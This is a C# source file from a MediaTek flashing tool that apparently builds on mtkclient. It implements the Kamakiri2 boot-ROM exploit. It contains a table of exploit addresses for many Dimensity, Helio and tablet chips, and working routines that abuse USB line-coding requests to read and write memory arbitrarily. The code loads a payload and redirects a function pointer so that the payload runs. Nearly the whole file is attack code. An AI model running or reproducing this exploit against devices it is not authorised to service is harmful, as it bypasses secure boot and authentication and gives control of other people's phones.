// ============================================================================
// LoveAlways - MediaTek Kamakiri2 Exploit (BROM layer)
// Based on mtkclient by B.Kerler (GPLv3) and MTKAuthBypassQT
// ============================================================================
// 
// ╔═══════════════════════════════════════════════════════════════════════════╗
// ║                      MTK Exploit Level Description                        ║
// ╠═══════════════════════════════════════════════════════════════════════════╣
// ║ Level   │ Exploit Name      │ Principle                                   ║
// ╠═════════╪═══════════════════╪═════════════════════════════════════════════╣
// ║ BROM    │ Kamakiri2         │ USB CDC SET_LINE_CODING arbitrary read/write ║
// ║         │ (This file)       │ Requires direct USB access, bypass BROM check║
// ╠═════════╪═══════════════════╪═════════════════════════════════════════════╣
// ║ DA1     │ Carbonara         │ Runtime modify DA2 expected hash in DA1     ║
// ║         │                   │ Via boot_to command, bypass DA2 signature   ║
// ╠═════════╪═══════════════════╪═════════════════════════════════════════════╣
// ║ DA2     │ AllinoneSignature │ DA2 XML encoding function buffer overflow   ║
// ║         │                   │ Use source_file to trigger shellcode        ║
// ╚═════════╧═══════════════════╧═════════════════════════════════════════════╝
//
// Note:
// - Kamakiri2 is also called "LineCode Exploit", they are the same
// - BROM layer exploits need direct USB access (libusb/WinUSB), serial fails
// - DA layer exploits can be executed via serial port
// ============================================================================

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// Eng Translation & some fixes by iReverse - HadiKIT - Hadi Khoirudin, S.Kom.
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


using LoveAlways.MediaTek.Common;
using LoveAlways.MediaTek.Database;
using LoveAlways.MediaTek.Protocol;
using System;
using System.Threading;
using System.Threading.Tasks;

namespace LoveAlways.MediaTek.Exploit
{
    /// <summary>
    /// Kamakiri2 Exploit
    /// Arbitrary memory read/write via USB CDC SET_LINE_CODING control transfer
    /// </summary>
    public class Kamakiri2Exploit
    {
        private readonly BromClient _brom;
        private readonly Action<string> _log;

        // Chip configuration
        private uint _ptrDa;
        private uint _ptrSend;
        private uint _bromPayloadAddr;
        private uint _wdgAddr;

        public bool IsExploited { get; private set; }
        public string LastError { get; private set; }

        public Kamakiri2Exploit(BromClient brom, Action<string> log = null)
        {
            _brom = brom;
            _log = log ?? delegate { };
        }

        /// <summary>
        /// Initialize chip configuration
        /// </summary>
        public bool Initialize(ushort hwCode)
        {
            var chipConfig = MtkChipDatabase.GetChip(hwCode);
            if (chipConfig == null)
            {
                LastError = $"Chip configuration not found: 0x{hwCode:X4}";
                return false;
            }

            // Get addresses required for exploit
            _bromPayloadAddr = chipConfig.BromPayloadAddr;
            _wdgAddr = chipConfig.WatchdogAddr;

            // Get brom_register_access and send_ptr configuration
            // These values need to be obtained from chip configuration
            var exploitConfig = GetExploitConfig(hwCode);
            if (exploitConfig == null)
            {
                LastError = $"Chip 0x{hwCode:X4} does not support Kamakiri2 exploit";
                return false;
            }

            _ptrDa = exploitConfig.Value.ptrDa;
            _ptrSend = exploitConfig.Value.ptrSend;

            _log($"[Kamakiri2] Initialization complete:");
            _log($"  BROM Payload Address: 0x{_bromPayloadAddr:X8}");
            _log($"  WDG Address: 0x{_wdgAddr:X8}");
            _log($"  ptr_da: 0x{_ptrDa:X8}");
            _log($"  ptr_send: 0x{_ptrSend:X8}");

            return true;
        }

        /// <summary>
        /// Get exploit configuration for chip
        /// Data source: mtkclient brom_config.py, MTKAuthBypassQT
        /// </summary>
        private (uint ptrDa, uint ptrSend)? GetExploitConfig(ushort hwCode)
        {
            // Chip configurations from mtkclient and MTKAuthBypassQT
            // ptrDa: brom_register_access address
            // ptrSend: send_ptr address
            return hwCode switch
            {
                // ═══════════════════════════════════════════════════════════════
                // Dimensity Series (Newer chips)
                // ═══════════════════════════════════════════════════════════════

                // MT6833 (Dimensity 700)
                0x0813 => (0x102870, 0x106B54),
                0x6833 => (0x102870, 0x106B54),

                // MT6853 (Dimensity 720)
                0x0600 => (0x102870, 0x106B60),
                0x6853 => (0x102870, 0x106B60),

                // MT6873 (Dimensity 800/820)
                0x0788 => (0x102870, 0x106B60),
                0x6873 => (0x102870, 0x106B60),

                // MT6877 (Dimensity 900)
                0x0766 => (0x102870, 0x106B60),
                0x0959 => (0x102870, 0x106B60),  // Preloader mode
                0x6877 => (0x102870, 0x106B60),

                // MT6885 (Dimensity 1000/1000+)
                0x0886 => (0x102870, 0x106B60),
                0x6885 => (0x102870, 0x106B60),

                // MT6891 (Dimensity 1100)
                0x0989 => (0x102870, 0x106B60),
                0x6891 => (0x102870, 0x106B60),

                // MT6893 (Dimensity 1200)
                0x0816 => (0x102870, 0x106B60),
                0x6893 => (0x102870, 0x106B60),

                // MT6895 (Dimensity 8000/8100/8200)
                0x0996 => (0x102870, 0x106B60),
                0x1172 => (0x102870, 0x106B60),
                0x6895 => (0x102870, 0x106B60),

                // ═══════════════════════════════════════════════════════════════
                // Helio Series (Mid-range chips)
                // ═══════════════════════════════════════════════════════════════

                // MT6781 (Helio G96)
                0x6781 => (0x102870, 0x106B54),

                // MT6765 (Helio P35/G35)
                0x0717 => (0x102760, 0x106490),
                0x0725 => (0x102760, 0x106490),
                0x6765 => (0x102760, 0x106490),

                // MT6768 (Helio G85)
                0x0551 => (0x102760, 0x106490),
                0x6768 => (0x102760, 0x106490),

                // MT6769 (Helio G80 variant)
                0x6769 => (0x102760, 0x106490),

                // MT6785 (Helio G90/G95)
                0x0588 => (0x102760, 0x106494),
                0x6785 => (0x102760, 0x106494),

                // MT6771 (Helio P60)
                0x0688 => (0x102760, 0x106490),
                0x6771 => (0x102760, 0x106490),

                // MT6779 (Helio P90)
                0x0507 => (0x102760, 0x106490),
                0x6779 => (0x102760, 0x106490),

                // MT6762 (Helio P22)
                0x0707 => (0x102760, 0x106490),
                0x6762 => (0x102760, 0x106490),

                // MT6761 (Helio A22)
                0x0562 => (0x102760, 0x106490),
                0x6761 => (0x102760, 0x106490),

                // MT6763 (Helio P23)
                0x0690 => (0x102760, 0x106490),
                0x6763 => (0x102760, 0x106490),

                // MT6739
                0x0699 => (0x102760, 0x106490),
                0x6739 => (0x102760, 0x106490),

                // ═══════════════════════════════════════════════════════════════
                // Legacy Chip Series
                // ═══════════════════════════════════════════════════════════════

                // MT6755 (Helio P10)
                0x0326 => (0x102760, 0x106490),
                0x6755 => (0x102760, 0x106490),

                // MT6757 (Helio P20)
                0x0601 => (0x102760, 0x106490),
                0x6757 => (0x102760, 0x106490),

                // MT6797 (Helio X20/X25)
                0x0279 => (0x102760, 0x106490),
                0x6797 => (0x102760, 0x106490),

                // MT6735/MT6737
                0x0321 => (0x102760, 0x106490),
                0x0335 => (0x102760, 0x106490),
                0x6735 => (0x102760, 0x106490),
                0x6737 => (0x102760, 0x106490),

                // MT6752/MT6753
                0x6752 => (0x102760, 0x106490),
                0x6753 => (0x102760, 0x106490),

                // ═══════════════════════════════════════════════════════════════
                // Tablet/IoT Chips
                // ═══════════════════════════════════════════════════════════════

                // MT8163
                0x8163 => (0x102760, 0x106490),

                // MT8167
                0x8167 => (0x102760, 0x106490),

                // MT8168
                0x8168 => (0x102760, 0x106490),

                // MT8173
                0x8173 => (0x102760, 0x106490),

                // MT8183
                0x8183 => (0x102870, 0x106B54),

                _ => null
            };
        }

        /// <summary>
        /// Check if chip supports Kamakiri2 exploit
        /// </summary>
        public static bool IsSupported(ushort hwCode)
        {
            var exploit = new Kamakiri2Exploit(null);
            return exploit.GetExploitConfig(hwCode) != null;
        }

        /// <summary>
        /// Get list of all chips supporting Kamakiri2 exploit
        /// </summary>
        public static ushort[] GetSupportedChips()
        {
            return new ushort[]
            {
                // Dimensity Series
                0x0813, 0x0600, 0x0788, 0x0766, 0x0959, 0x0886, 0x0989, 0x0816, 0x0996, 0x1172,
                // Helio Series
                0x0717, 0x0725, 0x0551, 0x0588, 0x0688, 0x0507, 0x0707, 0x0562, 0x0690, 0x0699,
                // Legacy Chips
                0x0326, 0x0601, 0x0279, 0x0321, 0x0335,
                // Tablet Chips
                0x8163, 0x8167, 0x8168, 0x8173, 0x8183
            };
        }

        /// <summary>
        /// Execute Kamakiri2 exploit
        /// </summary>
        public async Task<bool> RunExploitAsync(byte[] payload, CancellationToken ct = default)
        {
            if (payload == null || payload.Length == 0)
            {
                LastError = "Payload is empty";
                return false;
            }

            _log($"[Kamakiri2] Starting exploit execution, Payload size: {payload.Length} bytes");

            try
            {
                using var usb = new MtkUsbExploit(msg => _log(msg));

                // 1. Connect USB device
                if (!usb.Connect())
                {
                    LastError = "Unable to connect to USB device";
                    return false;
                }

                // 2. Read ptr_send value
                _log("[Kamakiri2] Reading ptr_send...");
                var ptrSendData = await BRomDaReadAsync(usb, _ptrSend, 4, ct);
                if (ptrSendData == null || ptrSendData.Length < 4)
                {
                    LastError = "Unable to read ptr_send";
                    return false;
                }

                uint ptrSend = MtkDataPacker.UnpackUInt32LE(ptrSendData, 0);
                _log($"[Kamakiri2] ptr_send value: 0x{ptrSend:X8}");

                // 3. Write payload to BROM payload address
                _log($"[Kamakiri2] Writing payload to 0x{_bromPayloadAddr:X8}...");
                if (!await BRomDaWriteAsync(usb, _bromPayloadAddr, payload, true, ct))
                {
                    LastError = "Unable to write payload";
                    return false;
                }

                // 4. Modify function pointer to point to our payload
                uint targetAddr = ptrSend + 8;
                var plAddrBytes = BitConverter.GetBytes(_bromPayloadAddr);
                _log($"[Kamakiri2] Modifying function pointer 0x{targetAddr:X8} -> 0x{_bromPayloadAddr:X8}...");
                if (!await BRomDaWriteAsync(usb, targetAddr, plAddrBytes, false, ct))
                {
                    LastError = "Unable to modify function pointer";
                    return false;
                }

                // 5. Wait for payload execution and check for ACK
                await Task.Delay(100, ct);

                // Read ACK (via serial port)
                var ackData = await _brom.ReadBytesAsync(4, 3000, ct);
                if (ackData != null && ackData.Length >= 4)
                {
                    uint ack = MtkDataPacker.UnpackUInt32BE(ackData, 0);
                    _log($"[Kamakiri2] Received ACK: 0x{ack:X8}");

                    if (ack == 0xA1A2A3A4 || ack == 0xC1C2C3C4)
                    {
                        _log("[Kamakiri2] ✓ Exploit successful!");
                        IsExploited = true;
                        return true;
                    }
                    else
                    {
                        LastError = $"ACK error: 0x{ack:X8}";
                        return false;
                    }
                }
                else
                {
                    // Try verifying memory read
                    var testRead = await BRomDaReadAsync(usb, 0x100000, 4, ct);
                    if (testRead != null && testRead.Length >= 4)
                    {
                        _log("[Kamakiri2] ✓ Exploit successful (verified via memory read)");
                        IsExploited = true;
                        return true;
                    }

                    LastError = "ACK not received";
                    return false;
                }
            }
            catch (Exception ex)
            {
                LastError = ex.Message;
                _log($"[Kamakiri2] Exception: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Read memory via Kamakiri2 exploit
        /// </summary>
        private async Task<byte[]> BRomDaReadAsync(MtkUsbExploit usb, uint addr, int len, CancellationToken ct)
        {
            // Initialize brom_register_access
            if (!await BRomRegAccessInitAsync(ct))
                ClearSerialBuffer();

            // Read watchdog register (stay alive)
            if (!await BRomReadCmd32Async(_wdgAddr + 0x50, 1, true, 4, ct))
                ClearSerialBuffer();

            // Trigger exploit - Modify ptr_da
            for (int i = 0; i < 3; i++)
            {
                if (!usb.BRomUpdateLineCoding(_ptrDa + 8 - 3 + (uint)i))
                    return null;
                await Task.Delay(5, ct);
            }

            await Task.Delay(50, ct);
            ClearSerialBuffer();

            // Select different reading methods based on address
            if (addr < 0x40)
            {
                for (int i = 0; i < 4; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 6 + (uint)(4 - i)))
                        return null;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessReadAsync(addr, len, true, ct);
            }
            else
            {
                for (int i = 0; i < 3; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 5 + (uint)(3 - i)))
                        return null;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessReadAsync(addr - 0x40, len, true, ct);
            }
        }

        /// <summary>
        /// Write memory via Kamakiri2 exploit
        /// </summary>
        private async Task<bool> BRomDaWriteAsync(MtkUsbExploit usb, uint addr, byte[] data, bool checkResult, CancellationToken ct)
        {
            // Initialize brom_register_access
            if (!await BRomRegAccessInitAsync(ct))
                ClearSerialBuffer();

            // Read watchdog register (stay alive)
            if (!await BRomReadCmd32Async(_wdgAddr + 0x50, 1, true, 4, ct))
                ClearSerialBuffer();

            // Trigger exploit - Modify ptr_da
            for (int i = 0; i < 3; i++)
            {
                if (!usb.BRomUpdateLineCoding(_ptrDa + 8 - 3 + (uint)i))
                    return false;
                await Task.Delay(5, ct);
            }

            await Task.Delay(50, ct);
            ClearSerialBuffer();

            // Select different writing methods based on address
            if (addr < 0x40)
            {
                for (int i = 0; i < 4; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 6 + (uint)(4 - i)))
                        return false;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessWriteAsync(addr, data, checkResult, ct);
            }
            else
            {
                for (int i = 0; i < 3; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 5 + (uint)(3 - i)))
                        return false;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessWriteAsync(addr - 0x40, data, checkResult, ct);
            }
        }

        /// <summary>
        /// Initialize brom_register_access
        /// </summary>
        private async Task<bool> BRomRegAccessInitAsync(CancellationToken ct)
        {
            if (!await _brom.EchoByteAsync(0xDA, ct)) return false;
            if (!await Write32EchoAsync(0, ct)) return false;
            if (!await Write32EchoAsync(0, ct)) return false;
            if (!await Write32EchoAsync(1, ct)) return false;

            var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return false;
            ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            if (ack != 0) return false;

            var data = await _brom.ReadBytesAsync(1, 1000, ct);
            if (data == null || data.Length < 1) return false;

            ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return false;
            ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            return ack == 0;
        }

        private void ClearSerialBuffer()
        {
            try { _brom.DiscardBuffers(); } catch { }
        }

        private async Task<bool> BRomReadCmd32Async(uint addr, uint count, bool read, uint len, CancellationToken ct)
        {
            if (!await _brom.EchoByteAsync(0xD1, ct))
                return false;

            if (!await Write32EchoAsync(addr, ct))
                return false;

            if (!await Write32EchoAsync(count, ct))
                return false;

            if (!read)
            {
                await _brom.ReadBytesAsync(2, 1000, ct);
                return true;
            }
            else
            {
                var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return false;
                ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                if (ack != 0) return false;

                var data = await _brom.ReadBytesAsync((int)len, 5000, ct);
                if (data == null) return false;

                ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return false;
                ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                return ack == 0;
            }
        }

        private async Task<byte[]> BRomRegAccessReadAsync(uint addr, int len, bool check, CancellationToken ct)
        {
            // Clear buffer
            await _brom.ReadBytesAsync(64, 50, ct);

            if (!await _brom.EchoByteAsync(0xDA, ct)) return null;
            if (!await Write32EchoAsync(0, ct)) return null;
            if (!await Write32EchoAsync(addr, ct)) return null;
            if (!await Write32EchoAsync((uint)len, ct)) return null;

            var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return null;
            ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            if (ack != 0) return null;

            var data = await _brom.ReadBytesAsync(len, 5000, ct);
            if (data == null || data.Length < len) return null;

            if (check)
            {
                ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return null;
                ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                if (ack != 0) return null;
            }

            return data;
        }

        private async Task<bool> BRomRegAccessWriteAsync(uint addr, byte[] data, bool check, CancellationToken ct)
        {
            if (!await _brom.EchoByteAsync(0xDA, ct)) return false;
            if (!await Write32EchoAsync(1, ct)) return false;
            if (!await Write32EchoAsync(addr, ct)) return false;
            if (!await Write32EchoAsync((uint)data.Length, ct)) return false;

            var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return false;
            ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            if (ack != 0) return false;

            await _brom.WriteBytesAsync(data, ct);

            if (check)
            {
                ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return false;
                ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                if (ack != 0) return false;
            }

            return true;
        }

        private async Task<bool> Write32EchoAsync(uint value, CancellationToken ct)
        {
            var data = new byte[4];
            MtkDataPacker.WriteUInt32BE(data, 0, value);
            return await _brom.EchoBytesAsync(data, ct);
        }
    }
}
